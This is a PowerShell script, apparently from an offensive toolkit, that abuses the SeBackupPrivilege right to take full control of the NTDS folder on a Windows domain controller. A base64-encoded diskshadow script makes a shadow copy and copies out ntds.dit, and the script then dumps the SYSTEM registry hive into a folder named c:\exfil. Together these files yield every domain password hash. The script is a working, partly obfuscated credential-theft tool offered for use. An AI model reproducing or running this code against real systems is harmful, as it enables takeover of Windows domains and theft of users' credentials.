function Backup-DumpNTDIS {


function Acl-FullControl {param ($user,$path)
$help = @"
.SYNOPSIS
    Acl-FullControl
    PowerShell Function: Acl-FullControl
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Acl-FullControl -user domain\usuario -path c:\users\administrador

    Description
    -----------
    If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.

"@
if ($user -eq $null -or $path -eq $null) {$help} else {
"[+] Current permissions:"
get-acl $path | fl
"[+] Changing permissions to $path"
$acl = get-acl $path
$aclpermisos = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow'
$permisoacl = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermisos
$acl.AddAccessRule($permisoacl)
set-acl -Path $path -AclObject $acl
"[+] Acls changed successfully."
get-acl -path $path | fl

}
}
$backup_acl = get-acl c:\windows\ntds

Acl-FullControl -user $env:USERDOMAIN\$env:username -path c:\windows\ntds
get-acl C:\ProgramData | set-acl c:\windows\ntds
mkdir c:\exfil -ErrorAction SilentlyContinue | Out-Null
Set-Location c:\exfil
$script = "c2V0IGNvbnRleHQgcGVyc2lzdGVudCBub3dyaXRlcnMgIAphZGQgdm9sdW1lIGM6IGFsaWFzIHNvbWVBbGlhczIgCmNyZWF0ZSAKZXhwb3NlICVzb21lQWxpYXMyJSBSOiAKZXhlYyAiYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIiAvayBjb3B5IHI6XHdpbmRvd3NcbnRkc1xudGRzLmRpdCBjOlxleGZpbFxudGRzLmRpdCAKZGVsZXRlIHNoYWRvd3Mgdm9sdW1lICVzb21lQWxpYXMyJSAKcmVzZXQgCg=="
$script = [System.Convert]::FromBase64String($script)
Set-Content -Path c:\exfil\script.txt -Value $script -Encoding Byte
sleep -Seconds 2
diskshadow.exe /s c:\exfil\script.txt
set-acl -path c:\windows\ntds $backup_acl
reg save HKLM\SYSTEM c:\exfil\system.dmp



}